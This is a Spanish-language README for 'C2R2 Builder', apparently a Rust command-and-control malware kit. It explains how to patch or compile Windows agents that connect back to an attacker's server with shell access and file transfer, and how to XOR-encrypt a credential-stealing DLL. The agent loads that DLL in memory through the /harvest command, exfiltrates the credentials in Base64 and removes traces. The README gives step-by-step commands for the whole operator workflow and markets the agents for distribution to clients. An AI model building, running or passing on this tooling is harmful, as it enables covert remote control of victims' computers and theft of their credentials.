# C2R2 Builder v2.0

Generador de agentes y módulos para C2R2.

## ⚡ NUEVO: Binary Patching (v2.0+)

**¡Ya no necesitas Rust para configurar agentes!**

El builder ahora puede **parchear binarios pre-compilados** para cambiar la IP del servidor sin recompilar:

```bash
# Configurar un agente existente con nueva IP
./builder patch-agent --input agent/agent.exe --output mi_agente.exe --server 192.168.1.201:4444
```

✅ **Perfecto para distribución a clientes** que solo necesitan configurar la IP.

Ver [USAGE.md](USAGE.md) para documentación completa.

## ⚠️ IMPORTANTE - Dos Formas de Usar el Builder

### 🎯 Opción 1: Parchear Binario (Recomendado para Usuarios Finales)

**Para:** Usuarios que descargaron un release de GitHub

```bash
./builder patch-agent \
    --input agent/agent.exe \
    --output configured_agent.exe \
    --server 192.168.1.100:4444
```

**Ventajas:**
- No requiere Rust
- No requiere MinGW
- Funciona en cualquier plataforma
- Configuración en segundos

### 🛠️ Opción 2: Compilar desde Código Fuente

**Para:** Desarrolladores con código fuente completo

```bash
./builder build-agent \
    --name mi_agente \
    --server 192.168.1.100:4444 \
    --production
```

**Requisitos:**
- Código fuente completo
- Rust + MinGW instalados
- Target Windows instalado

---

## ⚠️ Nota para Distribución

- ✅ **Recomendado**: Usar `build-all.ps1` en Windows (compila todo automáticamente)
- ✅ **Alternativa**: Builder en Linux x86_64 con Rust + MinGW instalado
- ❌ **NO usar**: `build-agent` en Raspberry Pi ARM64 (usar `patch-agent` en su lugar)

**Si estás en Raspberry Pi**: Usa `patch-agent` con el agente pre-compilado del release.

## 🎯 Funcionalidad

El builder tiene dos comandos principales:

### 1. `build-agent` - Genera el Agent Base

Crea un agente ligero (~500 KB) con funcionalidad básica del C2:
- Conexión directa al servidor
- Comandos shell
- Upload/Download archivos
- **NO incluye** stealer ni otros módulos pesados

### 2. `encrypt-module` - Genera Módulo Stealer

Encripta `stealer.dll` con XOR y lo prepara para ser usado con `/harvest`:
- Lee `target/release/stealer.dll`
- Genera clave XOR aleatoria de 32 bytes
- Encripta DLL
- Guarda `c2r2-server/modules/stealer.enc` y `stealer.key`

## 📋 Prerequisitos

**Solo necesario si quieres compilar manualmente (no recomendado - usa build-all.ps1):**

### Instalar MinGW-w64 (cross-compilation para Windows)

```bash
# En Linux/WSL
sudo apt install mingw-w64

# Agregar target de Windows a Rust
rustup target add x86_64-pc-windows-gnu
```

### Compilar la DLL de stealer

```bash
# IMPORTANTE: Usar --target para generar DLL (Windows), no .so (Linux)
cargo build --release --target x86_64-pc-windows-gnu --package stealer-dll

# Esto genera: target/x86_64-pc-windows-gnu/release/stealer.dll (~2 MB)
```

## 🚀 Uso

**Nota**: Los comandos se pueden ejecutar desde el directorio raíz del proyecto o desde `builder/`.

### Generar Agent

```bash
# Agent básico (localhost) - desde raíz del proyecto
cargo run -p builder -- build-agent --name test_agent --server 127.0.0.1:4444

# Agent para producción
cargo run -p builder -- build-agent --name prod_agent --server 192.168.1.100:4444
```

### Generar Módulo Stealer

```bash
# Encriptar stealer.dll (se puede ejecutar desde cualquier directorio)
cargo run -p builder -- encrypt-module
```

## 📦 Archivos Generados

### `build-agent`

```
{nombre}.exe                 ← Ejecutable del agent (~500 KB)
agent/src/config.rs          ← Configuración del C2 (generada)
```

### `encrypt-module`

```
c2r2-server/modules/
├── stealer.enc              ← DLL encriptada (XOR, ~2 MB)
└── stealer.key              ← Clave XOR (32 bytes)
```

## 🔒 Arquitectura Modular

### Flujo de `/harvest`

```
C2R2[1]> /harvest

1. Servidor sube stealer.enc al agent  (vía /upload interno)
2. Servidor sube stealer.key al agent
3. Servidor envía comando __HARVEST__
4. Agent desencripta DLL en memoria (XOR)
5. Agent ejecuta LoadLibrary + steal_credentials()
6. Agent retorna credenciales (Base64)
7. Agent limpia archivos temporales
```

## 🛠️ Workflow Completo

```bash
# 1. Compilar stealer DLL (Windows target desde Linux)
cargo build --release --target x86_64-pc-windows-gnu --package stealer-dll

# 2. Encriptar módulo
cd builder
cargo run -- encrypt-module

# 3. Generar agent
cargo run -- build-agent --name my_agent --server 10.0.0.5:4444

# 4. Ejecutar servidor C2
cd ../c2r2-server
cargo run --release -- --bind 0.0.0.0 --port 4444

# 5. Ejecutar agent en target Windows
# (Transferir my_agent.exe a Windows)
.\my_agent.exe

# 6. Desde C2, ejecutar /harvest
C2R2> /select 1
C2R2[1]> /harvest
```

## 📝 Notas

- El agent **NO** incluye código de stealer (más ligero: ~500 KB vs 2.5 MB)
- El módulo se transfiere **solo cuando se ejecuta** `/harvest`
- Los archivos `.enc` y `.key` NO están en Git (se generan localmente)
- El servidor debe tener `modules/stealer.enc` y `modules/stealer.key` antes de ejecutar `/harvest`
